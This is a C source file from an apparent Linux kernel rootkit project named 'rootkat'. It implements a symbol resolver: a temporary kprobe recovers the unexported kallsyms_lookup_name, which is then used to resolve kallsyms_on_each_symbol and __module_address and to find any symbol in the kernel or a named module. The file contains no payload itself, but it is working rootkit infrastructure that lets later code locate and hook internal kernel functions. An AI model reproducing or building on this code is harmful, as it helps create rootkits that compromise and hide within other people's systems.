// SPDX-License-Identifier: MIT
#include <linux/kprobes.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include "kallsyms.h"

#define TAG "rootkat/kallsyms: "

typedef unsigned long (*lookup_fn_t)(const char *name);
static lookup_fn_t lookup_fn;

/*
 * Linux 6.4+ dropped `struct module *` from the kallsyms_on_each_symbol
 * callback signature; rootkat targets 7.0+, so we use the modern shape.
 */
typedef int (*on_each_cb_t)(void *data, const char *name, unsigned long addr);
typedef int (*on_each_t)(on_each_cb_t fn, void *data);
static on_each_t on_each_sym;

/* __module_address is not always EXPORT_SYMBOL_GPL'd (Ubuntu 7.0
 * builds drop it from the symtab). Resolve via kallsyms and call
 * through a function pointer. */
typedef struct module *(*module_address_t)(unsigned long addr);
static module_address_t mod_addr_fn;

static int __kprobes noop_pre(struct kprobe *p, struct pt_regs *regs)
{
	return 0;
}

int rootkat_kallsyms_init(void)
{
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
		.pre_handler = noop_pre,
	};
	int rc;

	rc = register_kprobe(&kp);
	if (rc < 0) {
		pr_err(TAG "register_kprobe failed: %d\n", rc);
		return rc;
	}
	lookup_fn = (lookup_fn_t)kp.addr;
	unregister_kprobe(&kp);

	if (!lookup_fn) {
		pr_err(TAG "lookup_fn NULL after probe\n");
		return -ENOENT;
	}
	return 0;
}

unsigned long rootkat_lookup_name(const char *name)
{
	if (!lookup_fn)
		return 0;
	return lookup_fn(name);
}

struct rootkat_lookup_ctx {
	const char *target_name;
	const char *target_module;
	unsigned long result;
};

static int rootkat_lookup_cb(void *data, const char *name, unsigned long addr)
{
	struct rootkat_lookup_ctx *ctx = data;
	struct module *mod;

	if (strcmp(name, ctx->target_name))
		return 0;

	mod = mod_addr_fn ? mod_addr_fn(addr) : NULL;
	if (!mod) {
		/* vmlinux symbol */
		if (!ctx->target_module) {
			ctx->result = addr;
			return 1;
		}
		return 0;
	}
	if (ctx->target_module && !strcmp(mod->name, ctx->target_module)) {
		ctx->result = addr;
		return 1;
	}
	return 0;
}

unsigned long rootkat_lookup_in_module(const char *name,
                                       const char *module_name)
{
	struct rootkat_lookup_ctx ctx = {
		.target_name   = name,
		.target_module = module_name,
		.result        = 0,
	};

	if (!on_each_sym) {
		on_each_sym = (on_each_t)rootkat_lookup_name("kallsyms_on_each_symbol");
		if (!on_each_sym) {
			pr_warn(TAG "kallsyms_on_each_symbol not resolved\n");
			return 0;
		}
	}
	if (!mod_addr_fn) {
		mod_addr_fn = (module_address_t)rootkat_lookup_name("__module_address");
		if (!mod_addr_fn)
			pr_warn(TAG "__module_address not resolved (vmlinux/module distinction unreliable)\n");
	}
	on_each_sym(rootkat_lookup_cb, &ctx);
	if (ctx.result)
		pr_info(TAG "resolved '%s' in [%s] -> %lx\n",
		        name, module_name ? module_name : "vmlinux", ctx.result);
	else
		pr_warn(TAG "no '%s' in module [%s]\n",
		        name, module_name ? module_name : "vmlinux");
	return ctx.result;
}
